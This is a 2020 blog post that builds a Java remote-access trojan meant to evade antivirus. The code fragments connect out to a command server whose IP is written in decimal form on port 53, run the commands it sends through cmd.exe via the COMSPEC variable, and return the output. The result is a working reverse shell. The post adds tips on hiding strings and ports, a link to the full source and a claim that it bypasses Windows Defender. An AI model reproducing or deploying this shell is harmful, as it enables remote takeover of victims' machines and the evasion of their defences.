---
layout: article
title: Evading AV with Java Sockets
description: 
category: research
modified: 2020-08-06
tags: [java, evasion, sockets]
image:
    path: "/assets/images/JavaSockets.png"
---

<style>
.wrapper {
  max-width: 700px;
}
section {
  max-width: 700px;
  padding: 30px 0px 0px 0px;
}
pre, code {
    white-space: pre-wrap;
}
@media all and (max-width:480px) {
    img {float:center;display:block;margin:0 auto;}
}

@media all and (min-width:480px) {
    img {float:left;padding-right:30px;margin:0 auto;}
}
ul {
    list-style-image: none;
    list-style: none;
}
ul ul {
    margin:0;
}
p + ul {
    list-style: disc !important;
}
img {
    margin-bottom:8px;
    width: 100%;
}
pre, code {
    white-space: pre-wrap;
    word-wrap: break-word;
}
.highlighter-rouge {
    color: cyan;
}
body .gist .highlight {
    background: #272822;
}

body .gist .blob-num,
body .gist .blob-code-inner,
body .gist .pl-s2,
body .gist .pl-stj {
    color: #f8f8f2;
}
body .gist .pl-c1 {
    color: #ae81ff;
}
body .gist .pl-enti {
    color: #a6e22e;
    font-weight: 700;
}
body .gist .pl-st {
    color: #66d9ef;
}
body .gist .pl-mdr {
    color: #66d9ef;
    font-weight: 400;
}
body .gist .pl-ms1 {
    background: #fd971f;
}
body .gist .pl-c,
body .gist .pl-c span,
body .gist .pl-pdc {
    color: #75715e;
    font-style: italic;
}
body .gist .pl-cce,
body .gist .pl-cn,
body .gist .pl-coc,
body .gist .pl-enc,
body .gist .pl-ens,
body .gist .pl-kos,
body .gist .pl-kou,
body .gist .pl-mh .pl-pdh,
body .gist .pl-mp,
body .gist .pl-mp1 .pl-sf,
body .gist .pl-mq,
body .gist .pl-pde,
body .gist .pl-pse,
body .gist .pl-pse .pl-s2,
body .gist .pl-mp .pl-s3,
body .gist .pl-smi,
body .gist .pl-stp,
body .gist .pl-sv,
body .gist .pl-v,
body .gist .pl-vi,
body .gist .pl-vpf,
body .gist .pl-mri,
body .gist .pl-va,
body .gist .pl-vpu {
    color: #66d9ef;
}
body .gist .pl-cos,
body .gist .pl-ml,
body .gist .pl-pds,
body .gist .pl-s,
body .gist .pl-s1,
body .gist .pl-sol {
    color: #e6db74;
}
body .gist .pl-e,
body .gist .pl-ef,
body .gist .pl-en,
body .gist .pl-enf,
body .gist .pl-enm,
body .gist .pl-entc,
body .gist .pl-entm,
body .gist .pl-eoac,
body .gist .pl-eoac .pl-pde,
body .gist .pl-eoi,
body .gist .pl-mai .pl-sf,
body .gist .pl-mm,
body .gist .pl-pdv,
body .gist .pl-som,
body .gist .pl-sr,
body .gist .pl-vo {
    color: #a6e22e;
}
body .gist .pl-ent,
body .gist .pl-eoa,
body .gist .pl-eoai,
body .gist .pl-eoai .pl-pde,
body .gist .pl-k,
body .gist .pl-ko,
body .gist .pl-kolp,
body .gist .pl-mc,
body .gist .pl-mr,
body .gist .pl-ms,
body .gist .pl-s3,
body .gist .pl-smc,
body .gist .pl-smp,
body .gist .pl-sok,
body .gist .pl-sra,
body .gist .pl-src,
body .gist .pl-sre {
    color: #f92672;
}
body .gist .pl-mb,
body .gist .pl-pdb {
    color: #e6db74;
    font-weight: 700;
}
body .gist .pl-mi,
body .gist .pl-pdi {
    color: #f92672;
    font-style: italic;
}
body .gist .pl-pdc1,
body .gist .pl-scp {
    color: #ae81ff;
}
body .gist .pl-sc,
body .gist .pl-sf,
body .gist .pl-mo,
body .gist .pl-entl {
    color: #fd971f;
}
body .gist .pl-mi1,
body .gist .pl-mdht {
    color: #a6e22e;
    background: rgba(0, 64, 0, .5);
}
body .gist .pl-md,
body .gist .pl-mdhf {
    color: #f92672;
    background: rgba(64, 0, 0, .5);
}
body .gist .pl-mdh,
body .gist .pl-mdi {
    color: #a6e22e;
    font-weight: 400;
}
body .gist .pl-ib,
body .gist .pl-id,
body .gist .pl-ii,
body .gist .pl-iu {
    background: #a6e22e;
    color: #272822;
}

</style>   

<i>**06 August, 2020** — [Go back to homepage](../)</i>
# Evading AV with Network Sockets / Java SE

RAT trojans typically use WinAPI functions for injecting malicious shellcode in memory (RAM) which is then executed. While there are numerous methods of evading anti-malware or EDR solutions for such RATs that reside in disk using techniques such as partial code encryption, they can still be caught during runtime as a result of vendors using behaviour analysis through machine learning for exploit prevention. Such controlls are difficult to bypass, however, instead of leveraging WinAPI calls, sometimes simplicity is key.

A network socket is an endpoint of a two-way communication (TCP or UDP), identified by an IP address and a port number, which is used to send or receive data within a node on a computer network (could be LAN, WAN). They have a wide range of use cases, usually in a client-server architecture such as basic chat applications. A lot of programming languages implement libraries for programming sockets, and in this case, I will be using Java considering that it can be complied to bytecode in almost all operating systems which have JVM. Furthermore, its compile logic makes most of the Java applications seem legitimate, such as our case in programming a RAT trojan with a simple keylogging capability.

Unfortunately, in comparison with Python, Java requires more lines of code for using sockets. For demonstration purposes, I will be using one of my VPS servers as the listener IP address of `91.92.136.11`, which can be written in decimal format as `"1532790795"` thanks to [IP-Obfuscator.py](https://github.com/C-REMO/Obscure-IP-Obfuscator):

{% highlight java %}
Socket s = new Socket("1532790795", 53);
{% endhighlight %}

This will initiate a communication channel with the CNC server, so you need a listener program such as netcat (for the sake of demonstration) operating in port 53 – a common port found in malware as it is mainly allowed in firewalls and typically not scrutinized enough from a security perspective. Sockets in Java also require input and output streams for basic I/O operations, as well as `PrintWriter()` and `BufferedReader()` to properly write outward data.

{% highlight java %}
InputStream i = s.getInputStream();
OutputStream o = s.getOutputStream();
PrintWriter pw = new PrintWriter(o, true);
BufferedReader rr = new BufferedReader(new InputStreamReader(i));
{% endhighlight %}

Since our target OS is Windows, we will use the `%COMSPEC` environment variable which simply points to `C:\WINDOWS\system32\cmd.exe` – useful in bypassing string-referenced checks – to execute incoming data from a non-empty buffer:

{% highlight java %}
String inc, comSpec = System.getenv("comSpec") + " /c ";

while(true){
    if((inc = rr.readLine()) != null){
        Process p = Runtime.getRuntime().exec(comSpec + inc);
        Scanner sc = new Scanner(p.getInputStream());
        while (sc.hasNext()) pw.println(sc.nextLine());
        pw.flush();
        sc.close();
    }
}
{% endhighlight %}

We will also use the Path object to send the current working directory before command output for readability and convenience. The full source code is as follows:

<script src="https://gist.github.com/artikrh/fb4b51a99d5c7fb1f0ea4339c76bec39.js"></script>

Compiling this Java program into a Windows Excecutable comprises of convering `.jar` to `.exe` using [various tools](https://stackoverflow.com/questions/2011664/compiling-a-java-program-into-an-executable), however, I will be using the IntelliJ IDE to [directly build a binary artifact](https://www.youtube.com/watch?v=_KHCHiH2RZ0) and run the program with a fully up-to-date Windows Defender:

![Proof of Concept](/assets/images/JavaSockets.png)

<i><b>Disclaimer:</b> Usage of this application for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. I assume no liability and I am not responsible for any misuse or damage caused.</i>

<i>[Go back to homepage](../)</i>
